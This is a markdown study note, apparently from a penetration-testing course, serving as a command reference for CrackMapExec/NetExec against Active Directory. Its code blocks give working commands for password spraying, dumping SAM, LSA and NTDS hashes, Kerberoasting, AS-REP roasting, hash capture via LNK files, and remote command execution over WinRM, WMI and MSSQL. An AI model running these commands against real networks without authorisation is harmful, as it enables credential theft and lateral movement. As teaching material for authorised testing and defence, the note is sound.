---
tags: [tools, ad, pivoting, vapt]
difficulty: advanced
module: "59 - Complete Tools Reference"
topic: "59.60 CrackMapExec NetExec"
---

# CrackMapExec / NetExec: Complete Command Reference

CrackMapExec (CME) and its spiritual successor NetExec (NXC) are the "Swiss Army Knives" of Active Directory network penetration testing. They provide concurrent, threaded execution of administrative commands and enumeration techniques across entire networks by wrapping Impacket and other Python libraries.

*Note: CrackMapExec is largely unmaintained. NetExec is the active, community-driven fork. The syntax between the two is almost identical, and they will be treated interchangeably in this reference.*

## Core Architecture and Modules

CME/NXC operates on a protocol-centric modular design. It supports targeting specific protocols (SMB, WMI, WinRM, LDAP, MSSQL, RDP) across broad CIDR ranges or specific IP lists.

### ASCII Architecture Diagram

```text
+-----------------------+
| Attacker Machine      |
|                       |
|   [CrackMapExec]      |
|   /    |    \    \    |
| SMB  WinRM  WMI  LDAP |
+--|-----|-----|-----|--+
   |     |     |     |
   |     |     |     +----(TCP 389)----> [Domain Controller]
   |     |     |
   |     |     +----------(TCP 135)----> [Server Farm]
   |     |
   |     +----------------(TCP 5985)---> [Admin Workstations]
   |
   +----------------------(TCP 445)----> [Entire subnet /24]
```

## Basic Syntax and Target Specification

The fundamental structure is:
`nxc <protocol> <target(s)> -u <username> -p <password/hash> [options]`

**Targets can be:**
- A single IP: `192.168.1.10`
- A CIDR notation: `192.168.1.0/24`
- A text file containing IPs: `targets.txt`
- A hostname: `DC01.corp.local`

**Authentication:**
- Password: `-u admin -p Password123`
- Pass-the-Hash: `-u admin -H [LMHASH:]NTHASH`
- Local Auth (Not Domain): `--local-auth`
- Null Session: `-u '' -p ''`
- Kerberos Ticket: `-k` (Requires `KRB5CCNAME` set)

## Protocol-Specific Enumeration and Abuse

### 1. SMB (Server Message Block) - TCP 445
The most versatile protocol in CME/NXC.

**Basic Recon and SMB Signing:**
Identify live hosts, OS version, Domain name, and whether SMB signing is enforced.
```bash
nxc smb 10.10.10.0/24
# Look for "signing:False" for relay opportunities.
```

**Share Enumeration:**
List accessible SMB shares. Add `--spider` to search for specific file types within those shares.
```bash
nxc smb 10.10.10.0/24 -u user -p pass --shares
```

**Password Spraying:**
Spray a single password against a list of users.
```bash
nxc smb 10.10.10.5 -u users.txt -p 'Spring2024!' --continue-on-success
# Note: Always monitor account lockout thresholds before spraying.
```

**Credential Dumping (SAM & LSA):**
If the provided credentials yield `Pwn3d!` (Local Admin rights), dump local hashes.
```bash
nxc smb 10.10.10.5 -u admin -H <hash> --sam
nxc smb 10.10.10.5 -u admin -H <hash> --lsa
```

**NTDS.dit Extraction (DCSync):**
Target a DC to dump domain credentials (requires Domain Admin / DCSync rights).
```bash
nxc smb dc01.corp.local -u da -p pass --ntds vss
# Or just grab a specific user
nxc smb dc01.corp.local -u da -p pass --ntds vss --user victim
```

**Active Sessions and Logged-on Users:**
```bash
nxc smb 10.10.10.0/24 -u user -p pass --sessions
nxc smb 10.10.10.0/24 -u user -p pass --loggedon-users
```

### 2. WinRM (Windows Remote Management) - TCP 5985/5986
Ideal for stealthy lateral movement. Unlike SMB execution, WinRM acts as a native remote shell.

**Verify WinRM Access:**
```bash
nxc winrm 10.10.10.0/24 -u admin -p pass
# Returns 'Pwn3d!' if the user belongs to the Remote Management Users group or Local Admins.
```

**Command Execution:**
```bash
nxc winrm 10.10.10.5 -u admin -p pass -x "whoami /all"
```
*(Use `-x` for cmd.exe, `-X` for PowerShell).*

### 3. WMI (Windows Management Instrumentation) - TCP 135
Similar to WinRM but uses different underlying protocols.

**Command Execution via WMI:**
```bash
nxc wmi 10.10.10.5 -u admin -p pass -x "ipconfig"
```

### 4. LDAP (Lightweight Directory Access Protocol) - TCP 389/636
Used against Domain Controllers to query Active Directory objects.

**AS-REP Roasting:**
Check all domain users for 'Do not require pre-auth' and extract crackable hashes.
```bash
nxc ldap dc01.corp.local -u user -p pass --asreproast output_hashes.txt
```

**Kerberoasting:**
Extract crackable hashes for accounts with SPNs.
```bash
nxc ldap dc01.corp.local -u user -p pass --kerberoasting output_hashes.txt
```

**BloodHound Ingestion:**
NXC can run the Python BloodHound ingestor natively.
```bash
nxc ldap dc01.corp.local -u user -p pass --bloodhound --collection All
```

### 5. MSSQL (Microsoft SQL Server) - TCP 1433
Identify databases and execute commands via `xp_cmdshell`.

**Identify SQL Servers and Auth:**
```bash
nxc mssql 10.10.10.0/24 -u sa -p pass
```

**Enable and Execute Command (xp_cmdshell):**
```bash
nxc mssql 10.10.10.5 -u sa -p pass -q "SELECT @@VERSION"
nxc mssql 10.10.10.5 -u sa -p pass -x "whoami"
```

## Modules and Extensibility

NXC includes dozens of modules for specific exploits and enumeration techniques.
List modules: `nxc smb -L`

**Notable Modules:**
- `-M slinky`: Creates LNK files on a share to capture NetNTLMv2 hashes when users view the share.
- `-M rdp`: Checks if RDP is enabled.
- `-M zerologon`: Checks for the Zerologon vulnerability (CVE-2020-1472).
- `-M nopac`: Checks for SAMAccountName spoofing vulnerabilities.
- `-M gpp_password`: Searches domain controllers for Group Policy Preferences passwords.

Example of running a module:
```bash
nxc smb 10.10.10.0/24 -u user -p pass -M rdp
```

## Internal Database Management

NXC maintains a local SQLite database (`~/.nxc/workspaces/default/`) of all enumerated hosts, shares, and compromised credentials.

- To interact with the database, type `nxc` (or `cmedb`) without arguments to open the interactive prompt.
- `help` to list database commands.
- `creds` to view all collected credentials.
- `hosts` to view all identified hosts.

## Evasion and OPSEC

- **Pwn3d! is Noisy:** Actions like dumping SAM, LSA, or NTDS are extremely noisy and signatured by all modern EDRs.
- **Execution Context:** Command execution via `-x` over SMB drops a temporary file to disk and creates a service, which is highly visible.
- **Password Spraying Lockouts:** NXC has a `--continue-on-success` flag, but you must manually configure lockout delays to avoid locking accounts. NXC does not inherently know the domain policy unless queried beforehand (`nxc smb IP -u '' -p '' --pass-pol`).

## Chaining Opportunities
- NXC uses libraries from [[59 - Impacket All Scripts]] under the hood for its SMB and RPC interactions.
- Run NXC over [[56 - proxychains SOCKS Proxy Chaining]] to spray internal network ranges from external C2 infrastructure.
- Ingest the AD data gathered by NXC's LDAP module directly into [[57 - BloodHound Complete Usage and Query Reference]].

## Related Notes
- [[21 - Active Directory Enumeration]]
- [[22 - Active Directory Lateral Movement]]
- [[23 - Password Spraying and Credential Stuffing]]
